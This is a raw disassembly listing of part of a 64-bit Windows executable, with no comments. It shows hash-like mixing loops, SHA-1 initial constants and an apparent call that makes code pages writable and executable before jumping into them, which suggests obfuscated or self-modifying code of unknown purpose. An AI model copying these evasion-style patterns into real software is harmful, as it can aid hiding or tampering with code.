   140047861:	xor    r9,r10
   140047864:	mov    r10,rdx
   140047867:	movabs rsi,0x629eef0eeda7e1b9
   140047871:	xor    r10,rsi
   140047874:	imul   r10,r11
   140047878:	mov    rsi,r10
   14004787b:	shr    rsi,0x1d
   14004787f:	xor    rsi,r10
   140047882:	imul   rsi,rdi
   140047886:	mov    r11,rsi
   140047889:	shr    r11,0x20
   14004788d:	xor    r11,rsi
   140047890:	mov    r12,r9
   140047893:	rol    r12,0x7
   140047897:	mov    r15,r9
   14004789a:	rol    r15,0x29
   14004789e:	mov    r10,rdx
   1400478a1:	rol    r10,0x20
   1400478a5:	movabs rsi,0x6161c4ba7c2419b8
   1400478af:	xor    r10,rsi
   1400478b2:	add    r12,rdx
   1400478b5:	mov    r14,QWORD PTR [rbp+rcx*1+0x7c8]
   1400478bd:	add    r14,r12
   1400478c0:	mov    rbx,QWORD PTR [rbp+rcx*1+0x7d0]
   1400478c8:	add    rbx,r10
   1400478cb:	sub    r10,r12
   1400478ce:	movabs rdi,0xeb591050d1f713a9
   1400478d8:	add    rbx,r15
   1400478db:	add    r10,r15
   1400478de:	or     r11,0x1
   1400478e2:	imul   r14,r11
   1400478e6:	imul   rbx,r11
   1400478ea:	imul   r10,r11
   1400478ee:	add    r14,r8
   1400478f1:	add    rax,r14
   1400478f4:	movabs r11,0x406aa9c82dbf9701
   1400478fe:	sub    r10,r9
   140047901:	sub    r10,rbx
   140047904:	add    r10,rax
   140047907:	xor    rdx,rsi
   14004790a:	imul   rdx,r11
   14004790e:	mov    rax,rdx
   140047911:	shr    rax,0x1d
   140047915:	xor    rax,rdx
   140047918:	imul   rax,rdi
   14004791c:	mov    rdx,rax
   14004791f:	shr    rdx,0x20
   140047923:	xor    rdx,rax
   140047926:	add    rcx,0x10
   14004792a:	mov    rax,r10
   14004792d:	mov    r8,r9
   140047930:	jmp    0x140047838
   140047935:	mov    QWORD PTR [rbp+0x408],r8
   14004793c:	mov    QWORD PTR [rbp+0x410],rdx
   140047943:	mov    QWORD PTR [rbp+0x400],rax
   14004794a:	mov    r9d,DWORD PTR [rip+0x51147]        # 0x140098a98
   140047951:	mov    rcx,rdx
   140047954:	xor    rcx,r8
   140047957:	imul   rcx,r11
   14004795b:	mov    r10,rcx
   14004795e:	shr    r10,0x1d
   140047962:	xor    r10,rcx
   140047965:	imul   r10,rdi
   140047969:	mov    rcx,r10
   14004796c:	shr    rcx,0x20
   140047970:	xor    rcx,r10
   140047973:	mov    r10,rdx
   140047976:	movabs rsi,0x629eef0eeda7e1b9
   140047980:	xor    r10,rsi
   140047983:	imul   r10,r11
   140047987:	mov    rsi,r10
   14004798a:	shr    rsi,0x1d
   14004798e:	xor    rsi,r10
   140047991:	imul   rsi,rdi
   140047995:	mov    r11,rsi
   140047998:	shr    r11,0x20
   14004799c:	xor    r11,rsi
   14004799f:	mov    rsi,rcx
   1400479a2:	rol    rsi,0x7
   1400479a6:	or     r11,0x1
   1400479aa:	mov    rdi,rcx
   1400479ad:	rol    rdi,0x29
   1400479b1:	mov    r10,rdx
   1400479b4:	rol    r10,0x20
   1400479b8:	movabs rbx,0x6161c4ba7c2419b8
   1400479c2:	xor    r10,rbx
   1400479c5:	add    rsi,rdx
   1400479c8:	add    r9,rsi
   1400479cb:	imul   r9,r11
   1400479cf:	lea    rdx,[rdi+r10*1]
   1400479d3:	imul   rdx,r11
   1400479d7:	sub    r10,rsi
   1400479da:	add    r10,rdi
   1400479dd:	imul   r10,r11
   1400479e1:	add    r9,r8
   1400479e4:	add    r9,rax
   1400479e7:	sub    r10,rcx
   1400479ea:	sub    r10,rdx
   1400479ed:	add    r10,r9
   1400479f0:	add    rcx,r10
   1400479f3:	call   0x140063ec6
   1400479f8:	mov    rcx,QWORD PTR [rbp+0x1170]
   1400479ff:	mov    QWORD PTR [rsp+0x28],rcx
   140047a04:	mov    rcx,QWORD PTR [rbp+0x1180]
   140047a0b:	mov    QWORD PTR [rsp+0x20],rcx
   140047a10:	mov    rcx,QWORD PTR [rbp+0x5d8]
   140047a17:	mov    rdx,QWORD PTR [rbp+0x700]
   140047a1e:	mov    r8,rax
   140047a21:	mov    r9,QWORD PTR [rbp+0x1168]
   140047a28:	call   0x140063d03
   140047a2d:	mov    rsi,rax
   140047a30:	mov    edi,DWORD PTR [rip+0x51052]        # 0x140098a88
   140047a36:	test   edi,edi
   140047a38:	je     0x140047a5d
   140047a3a:	call   QWORD PTR [rip+0x4cc10]        # 0x140094650
   140047a40:	xor    eax,edi
   140047a42:	movabs rcx,0x250993835123b80f
   140047a4c:	imul   rax,rcx
   140047a50:	mov    rcx,rax
   140047a53:	shr    rcx,0x1d
   140047a57:	xor    rcx,rax
   140047a5a:	xor    rsi,rcx
   140047a5d:	mov    QWORD PTR [rbp+0x680],rsi
   140047a64:	mov    QWORD PTR [rbp+0x10b8],rsi
   140047a6b:	cmp    QWORD PTR [rbp+0x4d8],0x7
   140047a73:	jbe    0x140047ac8
   140047a75:	mov    rax,QWORD PTR [rbp+0x6f8]
   140047a7c:	lea    rcx,[rax+0x1]
   140047a80:	mov    QWORD PTR [rbp+0x10c8],rcx
   140047a87:	test   rax,rax
   140047a8a:	je     0x140047b10
   140047a90:	mov    rax,QWORD PTR [rbp+0x6f8]
   140047a97:	cmp    rax,QWORD PTR [rbp+0x7a8]
   140047a9e:	jbe    0x140047af7
   140047aa0:	mov    rdx,QWORD PTR [rbp+0x6f8]
   140047aa7:	sub    rdx,QWORD PTR [rbp+0x708]
   140047aae:	add    rdx,0x10
   140047ab2:	cmp    rdx,0x7
   140047ab6:	ja     0x140047af7
   140047ab8:	mov    al,BYTE PTR [rbp+rdx*1+0x10d8]
   140047abf:	mov    QWORD PTR [rbp+0x6f8],rcx
   140047ac6:	jmp    0x140047ae7
   140047ac8:	mov    rcx,QWORD PTR [rbp+0x4d8]
   140047acf:	mov    al,BYTE PTR [rbp+rcx*1+0x10b8]
   140047ad6:	inc    rcx
   140047ad9:	mov    QWORD PTR [rbp+0x4d8],rcx
   140047ae0:	mov    QWORD PTR [rbp+0x10c0],rcx
   140047ae7:	mov    QWORD PTR [rbp+0x1160],0x0
   140047af2:	push   0x1
   140047af4:	pop    rsi
   140047af5:	jmp    0x140047b27
   140047af7:	mov    QWORD PTR [rbp+0x1160],0x0
   140047b02:	mov    QWORD PTR [rbp+0x6f8],rcx
   140047b09:	push   0x1
   140047b0b:	pop    rsi
   140047b0c:	xor    eax,eax
   140047b0e:	jmp    0x140047b27
   140047b10:	mov    al,0x80
   140047b12:	push   0x1
   140047b14:	pop    rsi
   140047b15:	mov    QWORD PTR [rbp+0x6f8],rsi
   140047b1c:	mov    QWORD PTR [rbp+0x1160],0x0
   140047b27:	mov    rcx,QWORD PTR [rbp+0x7c0]
   140047b2e:	mov    BYTE PTR [rbp+rcx*1+0x710],al
   140047b35:	mov    rdi,QWORD PTR [rbp+0x3e8]
   140047b3c:	jmp    0x140043db2
   140047b41:	xor    edx,edx
   140047b43:	cmp    rdx,0x40
   140047b47:	je     0x140047b64
   140047b49:	mov    QWORD PTR [rbp+rdx*1+0x7d0],0x1
   140047b55:	and    QWORD PTR [rbp+rdx*1+0x7d8],0x0
   140047b5e:	add    rdx,0x10
   140047b62:	jmp    0x140047b43
   140047b64:	lea    rdx,[rbp+0x7e0]
   140047b6b:	movups xmm0,XMMWORD PTR [rdx]
   140047b6e:	movups xmm1,XMMWORD PTR [rdx+0x10]
   140047b72:	movups xmm2,XMMWORD PTR [rdx+0x20]
   140047b76:	lea    rdx,[rbp+0xf90]
   140047b7d:	movups XMMWORD PTR [rdx+0x20],xmm2
   140047b81:	movups XMMWORD PTR [rdx+0x10],xmm1
   140047b85:	movups XMMWORD PTR [rdx],xmm0
   140047b88:	mov    QWORD PTR [rbp+0xf80],rcx
   140047b8f:	mov    QWORD PTR [rbp+0xf88],rax
   140047b96:	push   0x1
   140047b98:	pop    rsi
   140047b99:	mov    QWORD PTR [rbp+0xfc0],rsi
   140047ba0:	lea    rdi,[rbp+0xf80]
   140047ba7:	mov    rcx,rdi
   140047baa:	call   0x14003bf02
   140047baf:	lea    rcx,[rax+0x9]
   140047bb3:	mov    rbx,rcx
   140047bb6:	shr    rbx,0x6
   140047bba:	and    ecx,0x3f
   140047bbd:	cmp    rcx,rsi
   140047bc0:	sbb    rbx,0xffffffffffffffff
   140047bc4:	mov    QWORD PTR [rbp+0x1158],rbx
   140047bcb:	shl    rbx,0x6
   140047bcf:	sub    rbx,rax
   140047bd2:	lea    r14,[rbx-0x9]
   140047bd6:	shl    rax,0x3
   140047bda:	bswap  rax
   140047bdd:	mov    QWORD PTR [rbp+0xd10],rdi
   140047be4:	mov    QWORD PTR [rbp+0xd18],rsi
   140047beb:	lea    rcx,[rbp+0xd18]
   140047bf2:	movups XMMWORD PTR [rcx+0x8],xmm6
   140047bf6:	movups XMMWORD PTR [rcx+0x18],xmm6
   140047bfa:	mov    QWORD PTR [rbp+0xd40],r14
   140047c01:	mov    QWORD PTR [rbp+0xd48],rax
   140047c08:	mov    eax,0x67452301
   140047c0d:	mov    QWORD PTR [rbp+0x1058],rax
   140047c14:	mov    DWORD PTR [rbp+0x1180],0xefcdab89
   140047c1e:	mov    DWORD PTR [rbp+0x1170],0x98badcfe
   140047c28:	mov    DWORD PTR [rbp+0x1178],0x10325476
   140047c32:	mov    DWORD PTR [rbp+0x1168],0xc3d2e1f0
   140047c3c:	mov    r13b,0x1
   140047c3f:	xor    r12d,r12d
   140047c42:	xor    r15d,r15d
   140047c45:	xor    edi,edi
   140047c47:	xor    esi,esi
   140047c49:	cmp    rsi,QWORD PTR [rbp+0x1158]
   140047c50:	je     0x140047f0d
   140047c56:	movaps XMMWORD PTR [rbp+0x2c0],xmm6
   140047c5d:	movaps XMMWORD PTR [rbp+0x2b0],xmm6
   140047c64:	movaps XMMWORD PTR [rbp+0x2a0],xmm6
   140047c6b:	movaps XMMWORD PTR [rbp+0x290],xmm6
   140047c72:	mov    rax,QWORD PTR [rbp+0xf80]
   140047c79:	mov    rcx,QWORD PTR [rbp+0xf88]
   140047c80:	xor    r8d,r8d
   140047c83:	cmp    r8,0x40
   140047c87:	je     0x140047d12
   140047c8d:	mov    rdx,r8
   140047c90:	inc    r8
   140047c93:	test   rdi,rdi
   140047c96:	sete   r10b
   140047c9a:	mov    r9,r15
   140047c9d:	test   r10b,0x1
   140047ca1:	je     0x140047cbc
   140047ca3:	xor    r15d,r15d
   140047ca6:	mov    r10d,0x0
   140047cac:	cmp    r9,rcx
   140047caf:	jae    0x140047c9a
   140047cb1:	mov    r10b,BYTE PTR [rax+r9*1]
   140047cb5:	inc    r9
   140047cb8:	xor    edi,edi
   140047cba:	jmp    0x140047d02
   140047cbc:	test   r12,r12
   140047cbf:	je     0x140047cf5
   140047cc1:	lea    r11,[r12+0x1]
   140047cc6:	cmp    r12,r14
   140047cc9:	jbe    0x140047ce7
   140047ccb:	sub    r12,rbx
   140047cce:	cmp    r12,0xfffffffffffffff8
   140047cd2:	jb     0x140047ce7
   140047cd4:	mov    r10b,BYTE PTR [rbp+r12*1+0xd50]
   140047cdc:	xor    r13d,r13d
   140047cdf:	push   0x1
   140047ce1:	pop    rdi
   140047ce2:	mov    r12,r11
   140047ce5:	jmp    0x140047d02
   140047ce7:	xor    r13d,r13d
   140047cea:	push   0x1
   140047cec:	pop    rdi
   140047ced:	mov    r12,r11
   140047cf0:	xor    r10d,r10d
   140047cf3:	jmp    0x140047d02
   140047cf5:	mov    r10b,0x80
   140047cf8:	xor    r13d,r13d
   140047cfb:	push   0x1
   140047cfd:	pop    r12
   140047cff:	mov    rdi,r12
   140047d02:	mov    BYTE PTR [rbp+rdx*1+0x290],r10b
   140047d0a:	mov    r15,r9
   140047d0d:	jmp    0x140047c83
   140047d12:	mov    BYTE PTR [rbp+0xd50],r13b
   140047d19:	mov    QWORD PTR [rbp+0xd20],rdi
   140047d20:	mov    QWORD PTR [rbp+0xd28],r15
   140047d27:	mov    QWORD PTR [rbp+0xd38],r12
   140047d2e:	movaps XMMWORD PTR [rbp+0x430],xmm6
   140047d35:	movaps XMMWORD PTR [rbp+0x420],xmm6
   140047d3c:	movaps XMMWORD PTR [rbp+0x410],xmm6
   140047d43:	movaps XMMWORD PTR [rbp+0x400],xmm6
   140047d4a:	xor    eax,eax
   140047d4c:	cmp    rax,0x40
   140047d50:	je     0x140047d68
   140047d52:	mov    ecx,DWORD PTR [rbp+rax*1+0x290]
   140047d59:	bswap  ecx
   140047d5b:	mov    DWORD PTR [rbp+rax*1+0x400],ecx
   140047d62:	add    rax,0x4
   140047d66:	jmp    0x140047d4c
   140047d68:	mov    rax,QWORD PTR [rbp+0x1058]
   140047d6f:	mov    DWORD PTR [rbp+0x7d0],eax
   140047d75:	mov    eax,DWORD PTR [rbp+0x1180]
   140047d7b:	mov    DWORD PTR [rbp+0x7d4],eax
   140047d81:	mov    eax,DWORD PTR [rbp+0x1170]
   140047d87:	mov    DWORD PTR [rbp+0x7d8],eax
   140047d8d:	mov    eax,DWORD PTR [rbp+0x1178]
   140047d93:	mov    DWORD PTR [rbp+0x7dc],eax
   140047d99:	mov    eax,DWORD PTR [rbp+0x1168]
   140047d9f:	mov    DWORD PTR [rbp+0x7e0],eax
   140047da5:	and    DWORD PTR [rbp+0x7e4],0x0
   140047dac:	movaps xmm0,XMMWORD PTR [rbp+0x400]
   140047db3:	movaps xmm1,XMMWORD PTR [rbp+0x410]
   140047dba:	movaps xmm2,XMMWORD PTR [rbp+0x420]
   140047dc1:	movaps xmm3,XMMWORD PTR [rbp+0x430]
   140047dc8:	lea    rax,[rbp+0x7e8]
   140047dcf:	movups XMMWORD PTR [rax+0x30],xmm3
   140047dd3:	movups XMMWORD PTR [rax+0x20],xmm2
   140047dd7:	movups XMMWORD PTR [rax+0x10],xmm1
   140047ddb:	movups XMMWORD PTR [rax],xmm0
   140047dde:	call   0x140064214
   140047de3:	mov    al,BYTE PTR [rip+0x50ca4]        # 0x140098a8d
   140047de9:	cmp    al,0x1
   140047deb:	je     0x140047e34
   140047ded:	movzx  eax,al
   140047df0:	cmp    eax,0x2
   140047df3:	je     0x140047efe
   140047df9:	and    DWORD PTR [rbp+0x640],0x0
   140047e00:	lea    rcx,[rip+0xfffffffffffb9279]        # 0x140001080
   140047e07:	mov    rdx,QWORD PTR [rbp+0x1150]
   140047e0e:	push   0x40
   140047e10:	pop    r8
   140047e12:	lea    r9,[rbp+0x640]
   140047e19:	call   QWORD PTR [rip+0x4c9e9]        # 0x140094808
   140047e1f:	test   eax,eax
   140047e21:	sete   cl
   140047e24:	inc    cl
   140047e26:	mov    BYTE PTR [rip+0x50c61],cl        # 0x140098a8d
   140047e2c:	test   eax,eax
   140047e2e:	je     0x140047efe
   140047e34:	mov    al,BYTE PTR [rip+0x50d7e]        # 0x140098bb8
   140047e3a:	cmp    al,0x1
   140047e3c:	je     0x140047e65
   140047e3e:	movzx  eax,al
   140047e41:	test   eax,eax
   140047e43:	jne    0x140047efe
   140047e49:	call   0x140065d51
   140047e4e:	test   rax,rax
   140047e51:	sete   cl
   140047e54:	inc    cl
   140047e56:	mov    BYTE PTR [rip+0x50d5c],cl        # 0x140098bb8
   140047e5c:	test   rax,rax
   140047e5f:	je     0x140047efe
   140047e65:	call   0x140064227
   140047e6a:	mov    eax,0xc8c291de
   140047e6f:	xchg   DWORD PTR [rip+0x50c6b],eax        # 0x140098ae0
   140047e75:	call   QWORD PTR [rip+0x4c7d5]        # 0x140094650
   140047e7b:	mov    eax,eax
   140047e7d:	mov    QWORD PTR [rip+0x5017c],rax        # 0x140098000
   140047e84:	lea    rcx,[rbp+0x7d0]
   140047e8b:	push   0xffffffffffffffff
   140047e8d:	pop    rdx
   140047e8e:	call   0x14001dfc0
   140047e93:	xor    eax,eax
   140047e95:	xchg   DWORD PTR [rip+0x50c45],eax        # 0x140098ae0
   140047e9b:	mov    BYTE PTR [rip+0x50bec],0x0        # 0x140098a8e
   140047ea2:	mov    rax,QWORD PTR [rbp+0x1058]
   140047ea9:	add    eax,DWORD PTR [rbp+0x7d0]
   140047eaf:	mov    QWORD PTR [rbp+0x1058],rax
   140047eb6:	mov    eax,DWORD PTR [rbp+0x1180]
   140047ebc:	add    eax,DWORD PTR [rbp+0x7d4]
   140047ec2:	mov    DWORD PTR [rbp+0x1180],eax
   140047ec8:	mov    eax,DWORD PTR [rbp+0x1170]
   140047ece:	add    eax,DWORD PTR [rbp+0x7d8]
   140047ed4:	mov    DWORD PTR [rbp+0x1170],eax
   140047eda:	mov    eax,DWORD PTR [rbp+0x1178]
   140047ee0:	add    eax,DWORD PTR [rbp+0x7dc]
   140047ee6:	mov    DWORD PTR [rbp+0x1178],eax
   140047eec:	mov    eax,DWORD PTR [rbp+0x1168]
   140047ef2:	add    eax,DWORD PTR [rbp+0x7e0]
   140047ef8:	mov    DWORD PTR [rbp+0x1168],eax
   140047efe:	inc    rsi
   140047f01:	mov    BYTE PTR [rip+0x50b84],0x0        # 0x140098a8c
   140047f08:	jmp    0x140047c49
   140047f0d:	mov    eax,DWORD PTR [rbp+0x1180]
   140047f13:	mov    rcx,QWORD PTR [rbp+0x1058]
   140047f1a:	shl    rcx,0x20
   140047f1e:	or     rcx,rax
   140047f21:	bswap  rcx
   140047f24:	mov    QWORD PTR [rbp+0x1058],rcx
   140047f2b:	mov    rcx,QWORD PTR [rbp+0x1140]
   140047f32:	mov    rdx,QWORD PTR [rbp+0xf78]
   140047f39:	call   0x140066533
   140047f3e:	jmp    0x1400445b6
   140047f43:	movaps XMMWORD PTR [rbp+0xd40],xmm6
   140047f4a:	movaps XMMWORD PTR [rbp+0xd30],xmm6
   140047f51:	movaps XMMWORD PTR [rbp+0xd20],xmm6
   140047f58:	movaps XMMWORD PTR [rbp+0xd10],xmm6
   140047f5f:	xor    eax,eax
   140047f61:	cmp    rax,0x40
   140047f65:	je     0x140047f7d
   140047f67:	mov    ecx,DWORD PTR [rbp+rax*1+0x710]
   140047f6e:	bswap  ecx
   140047f70:	mov    DWORD PTR [rbp+rax*1+0xd10],ecx
   140047f77:	add    rax,0x4
   140047f7b:	jmp    0x140047f61
   140047f7d:	mov    eax,DWORD PTR [rbp+0x7b4]
   140047f83:	mov    DWORD PTR [rbp+0x7d0],eax
   140047f89:	mov    rax,QWORD PTR [rbp+0x6d0]
   140047f90:	mov    DWORD PTR [rbp+0x7d4],eax
   140047f96:	mov    eax,DWORD PTR [rbp+0x3f8]
   140047f9c:	mov    DWORD PTR [rbp+0x7d8],eax
   140047fa2:	mov    rax,QWORD PTR [rbp+0x6a8]
   140047fa9:	mov    DWORD PTR [rbp+0x7dc],eax
   140047faf:	mov    eax,DWORD PTR [rbp+0x6e4]
   140047fb5:	mov    DWORD PTR [rbp+0x7e0],eax
   140047fbb:	and    DWORD PTR [rbp+0x7e4],0x0
   140047fc2:	movaps xmm0,XMMWORD PTR [rbp+0xd10]
   140047fc9:	movaps xmm1,XMMWORD PTR [rbp+0xd20]
   140047fd0:	movaps xmm2,XMMWORD PTR [rbp+0xd30]
   140047fd7:	movaps xmm3,XMMWORD PTR [rbp+0xd40]
   140047fde:	lea    rax,[rbp+0x7e8]
   140047fe5:	movups XMMWORD PTR [rax+0x30],xmm3
   140047fe9:	movups XMMWORD PTR [rax+0x20],xmm2
   140047fed:	movups XMMWORD PTR [rax+0x10],xmm1
   140047ff1:	movups XMMWORD PTR [rax],xmm0
   140047ff4:	call   0x140064214
   140047ff9:	mov    al,BYTE PTR [rip+0x50a8e]        # 0x140098a8d
   140047fff:	cmp    al,0x1
   140048001:	je     0x14004804a
   140048003:	movzx  eax,al
   140048006:	cmp    eax,0x2
   140048009:	je     0x140048116
   14004800f:	and    DWORD PTR [rbp+0xf80],0x0
   140048016:	lea    rcx,[rip+0xfffffffffffb9063]        # 0x140001080
   14004801d:	mov    rdx,QWORD PTR [rbp+0x1150]
   140048024:	push   0x40
   140048026:	pop    r8
   140048028:	lea    r9,[rbp+0xf80]
   14004802f:	call   QWORD PTR [rip+0x4c7d3]        # 0x140094808
   140048035:	test   eax,eax
   140048037:	sete   cl
   14004803a:	inc    cl
   14004803c:	mov    BYTE PTR [rip+0x50a4b],cl        # 0x140098a8d
   140048042:	test   eax,eax
   140048044:	je     0x140048116
   14004804a:	mov    al,BYTE PTR [rip+0x50b68]        # 0x140098bb8
   140048050:	cmp    al,0x1
   140048052:	je     0x14004807b
   140048054:	movzx  eax,al
   140048057:	test   eax,eax
   140048059:	jne    0x140048116
   14004805f:	call   0x140065d51
   140048064:	test   rax,rax
   140048067:	sete   cl
   14004806a:	inc    cl
   14004806c:	mov    BYTE PTR [rip+0x50b46],cl        # 0x140098bb8
   140048072:	test   rax,rax
   140048075:	je     0x140048116
   14004807b:	call   0x140064227
   140048080:	mov    eax,0xc8c291de
   140048085:	xchg   DWORD PTR [rip+0x50a55],eax        # 0x140098ae0
   14004808b:	call   QWORD PTR [rip+0x4c5bf]        # 0x140094650
   140048091:	mov    eax,eax
   140048093:	mov    QWORD PTR [rip+0x4ff66],rax        # 0x140098000
   14004809a:	lea    rcx,[rbp+0x7d0]
   1400480a1:	push   0xffffffffffffffff
   1400480a3:	pop    rdx
   1400480a4:	call   0x14001dfc0
   1400480a9:	xor    eax,eax
   1400480ab:	xchg   DWORD PTR [rip+0x50a2f],eax        # 0x140098ae0
   1400480b1:	mov    BYTE PTR [rip+0x509d6],0x0        # 0x140098a8e
   1400480b8:	mov    eax,DWORD PTR [rbp+0x7b4]
   1400480be:	add    eax,DWORD PTR [rbp+0x7d0]
   1400480c4:	mov    DWORD PTR [rbp+0x7b4],eax
   1400480ca:	mov    rax,QWORD PTR [rbp+0x6d0]
   1400480d1:	add    eax,DWORD PTR [rbp+0x7d4]
   1400480d7:	mov    QWORD PTR [rbp+0x6d0],rax
   1400480de:	mov    eax,DWORD PTR [rbp+0x3f8]
   1400480e4:	add    eax,DWORD PTR [rbp+0x7d8]
   1400480ea:	mov    DWORD PTR [rbp+0x3f8],eax
   1400480f0:	mov    rax,QWORD PTR [rbp+0x6a8]
   1400480f7:	add    eax,DWORD PTR [rbp+0x7dc]
   1400480fd:	mov    QWORD PTR [rbp+0x6a8],rax
   140048104:	mov    eax,DWORD PTR [rbp+0x6e4]
   14004810a:	add    eax,DWORD PTR [rbp+0x7e0]
   140048110:	mov    DWORD PTR [rbp+0x6e4],eax
   140048116:	mov    BYTE PTR [rip+0x5096f],0x0        # 0x140098a8c
   14004811d:	jmp    0x140043d70
   140048122:	lea    r8,[rip+0x40127]        # 0x140088250
   140048129:	jmp    0x140048132
   14004812b:	lea    r8,[rip+0x401be]        # 0x1400882f0
   140048132:	push   0x2
   140048134:	pop    rdx
   140048135:	jmp    0x14004814d
   140048137:	lea    r8,[rip+0x4012a]        # 0x140088268
   14004813e:	jmp    0x140048147
   140048140:	lea    r8,[rip+0x400a1]        # 0x1400881e8
   140048147:	push   0xc
   140048149:	pop    rcx
   14004814a:	mov    rdx,rcx
   14004814d:	call   0x14007da89
   140048152:	ud2
   140048154:	mov    eax,DWORD PTR [rbp+0x3f8]
   14004815a:	mov    QWORD PTR [rbp+0x5d8],rax
   140048161:	cmp    QWORD PTR [rbp+0x798],0x8
   140048169:	jae    0x140048182
   14004816b:	mov    rax,QWORD PTR [rbp+0x6a8]
   140048172:	shl    rax,0x20
   140048176:	add    QWORD PTR [rbp+0x5d8],rax
   14004817d:	jmp    0x140048291
   140048182:	mov    rax,QWORD PTR [rbp+0x6d0]
   140048189:	shl    rax,0x20
   14004818d:	mov    edx,DWORD PTR [rbp+0x7b4]
   140048193:	or     rdx,rax
   140048196:	mov    r8,QWORD PTR [rbp+0x6a8]
   14004819d:	shl    r8,0x20
   1400481a1:	mov    rcx,QWORD PTR [rbp+0x5d8]
   1400481a8:	or     rcx,r8
   1400481ab:	mov    rax,rcx
   1400481ae:	mov    QWORD PTR [rbp+0x5d8],rcx
   1400481b5:	rol    rax,0x11
   1400481b9:	mov    rcx,QWORD PTR [rbp+0x798]
   1400481c0:	lea    r8,[rcx-0x7]
   1400481c4:	mov    ecx,DWORD PTR [rbp+0x6e4]
   1400481ca:	xor    rcx,rdx
   1400481cd:	xor    rcx,rax
   1400481d0:	and    QWORD PTR [rbp+0x7d0],0x0
   1400481d8:	xor    r9d,r9d
   1400481db:	cmp    r9,0x2aea540
   1400481e2:	je     0x140048277
   1400481e8:	mov    r10,rcx
   1400481eb:	shr    r10,0x20
   1400481ef:	imul   r10,r8
   1400481f3:	shr    r10,0x20
   1400481f7:	lea    rax,[r10+0x8]
   1400481fb:	cmp    rax,QWORD PTR [rbp+0x798]
   140048202:	jbe    0x140048231
   140048204:	xor    r11d,r11d
   140048207:	cmp    r11,0x8
   14004820b:	je     0x140048250
   14004820d:	lea    rax,[r10+r11*1]
   140048211:	xor    edx,edx
   140048213:	div    QWORD PTR [rbp+0x798]
   14004821a:	mov    rax,QWORD PTR [rbp+0xd08]
   140048221:	mov    al,BYTE PTR [rax+rdx*1]
   140048224:	mov    BYTE PTR [rbp+r11*1+0x7d0],al
   14004822c:	inc    r11
   14004822f:	jmp    0x140048207
   140048231:	add    r10,QWORD PTR [rbp+0xd08]
   140048238:	xor    eax,eax
   14004823a:	cmp    rax,0x8
   14004823e:	je     0x140048250
   140048240:	mov    dl,BYTE PTR [r10+rax*1]
   140048244:	mov    BYTE PTR [rbp+rax*1+0x7d0],dl
   14004824b:	inc    rax
   14004824e:	jmp    0x14004823a
   140048250:	xor    rcx,QWORD PTR [rbp+0x7d0]
   140048257:	movabs rax,0xf8714df9dba9a23d
   140048261:	imul   rcx,rax
   140048265:	mov    rax,rcx
   140048268:	shr    rax,0x1d
   14004826c:	xor    rcx,rax
   14004826f:	inc    r9
   140048272:	jmp    0x1400481db
   140048277:	xor    DWORD PTR [rbp+0x7b4],ecx
   14004827d:	shr    rcx,0x20
   140048281:	mov    rax,QWORD PTR [rbp+0x6d0]
   140048288:	xor    eax,ecx
   14004828a:	mov    QWORD PTR [rbp+0x6d0],rax
   140048291:	mov    rax,QWORD PTR [rbp+0x680]
   140048298:	mov    QWORD PTR [rbp+0x4e8],rax
   14004829f:	mov    rcx,QWORD PTR [rbp+0x388]
   1400482a6:	mov    rdx,QWORD PTR [rbp+0x4f8]
   1400482ad:	call   0x14006f7f7
   1400482b2:	movaps xmm6,XMMWORD PTR [rip+0x37757]        # 0x14007fa10
   1400482b9:	movups XMMWORD PTR [rbp+0x7d8],xmm6
   1400482c0:	mov    DWORD PTR [rbp+0x7e8],0xbc648de3
   1400482ca:	push   0x2
   1400482cc:	pop    rcx
   1400482cd:	xor    r8d,r8d
   1400482d0:	push   0x5
   1400482d2:	pop    r10
   1400482d4:	mov    rax,r8
   1400482d7:	xor    edx,edx
   1400482d9:	div    r10
   1400482dc:	mov    r9,rax
   1400482df:	mov    rax,rcx
   1400482e2:	xor    edx,edx
   1400482e4:	div    r10
   1400482e7:	cmp    r8,0x8
   1400482eb:	je     0x14004833b
   1400482ed:	imul   rdx,r9,0xffffffffffffffec
   1400482f1:	lea    r9,[rbp+0x7d8]
   1400482f8:	add    rdx,r9
   1400482fb:	imul   rax,rax,0xffffffffffffffec
   1400482ff:	lea    r9,[rbp+0x7e0]
   140048306:	add    rax,r9
   140048309:	movzx  r9d,BYTE PTR [rbp+r8*1+0x1d0]
   140048312:	xor    r9d,DWORD PTR [rdx+r8*4]
   140048316:	imul   r9d,r9d,0x24713b5
   14004831d:	rol    r9d,0xd
   140048321:	mov    DWORD PTR [rdx+r8*4],r9d
   140048325:	mov    edx,DWORD PTR [rax+r8*4]
   140048329:	rol    edx,0x7
   14004832c:	xor    edx,r9d
   14004832f:	mov    DWORD PTR [rax+r8*4],edx
   140048333:	inc    r8
   140048336:	inc    rcx
   140048339:	jmp    0x1400482d4
   14004833b:	lea    rsi,[rbp+0x7d0]
   140048342:	mov    QWORD PTR [rsi],0x8
   140048349:	lea    rdi,[rbp+0xbc]
   140048350:	mov    rcx,rdi
   140048353:	mov    rdx,rsi
   140048356:	call   0x14006409d
   14004835b:	mov    ecx,DWORD PTR [rdi]
   14004835d:	mov    r8d,DWORD PTR [rdi+0x4]
   140048361:	mov    edx,DWORD PTR [rdi+0x8]
   140048364:	mov    r9d,DWORD PTR [rdi+0xc]
   140048368:	mov    eax,DWORD PTR [rdi+0x10]
   14004836b:	mov    QWORD PTR [rbp+0xf60],rcx
   140048372:	mov    DWORD PTR [rsi],ecx
   140048374:	mov    QWORD PTR [rbp+0x1140],r8
   14004837b:	mov    DWORD PTR [rsi+0x4],r8d
   14004837f:	mov    QWORD PTR [rbp+0x7c0],rdx
   140048386:	mov    DWORD PTR [rsi+0x8],edx
   140048389:	mov    QWORD PTR [rbp+0x1160],r9
   140048390:	mov    DWORD PTR [rsi+0xc],r9d
   140048394:	mov    DWORD PTR [rsi+0x10],eax
   140048397:	movabs r13,0x4a509c55caff7e3b
   1400483a1:	xor    eax,eax
   1400483a3:	movabs rcx,0xad3afd00644a60e3
   1400483ad:	cmp    rax,0x14
   1400483b1:	je     0x1400483d1
   1400483b3:	mov    edx,DWORD PTR [rbp+rax*1+0x7d0]
   1400483ba:	add    rax,0x4
   1400483be:	xor    r13,rdx
   1400483c1:	imul   r13,rcx
   1400483c5:	mov    rdx,r13
   1400483c8:	shr    rdx,0x1d
   1400483cc:	xor    r13,rdx
   1400483cf:	jmp    0x1400483ad
   1400483d1:	lea    rsi,[rbp+0xf80]
   1400483d8:	lea    rdx,[rbp+0x36c]
   1400483df:	lea    r8,[rbp+0xbc]
   1400483e6:	mov    rcx,rsi
   1400483e9:	call   0x1400641c0
   1400483ee:	mov    eax,DWORD PTR [rsi]
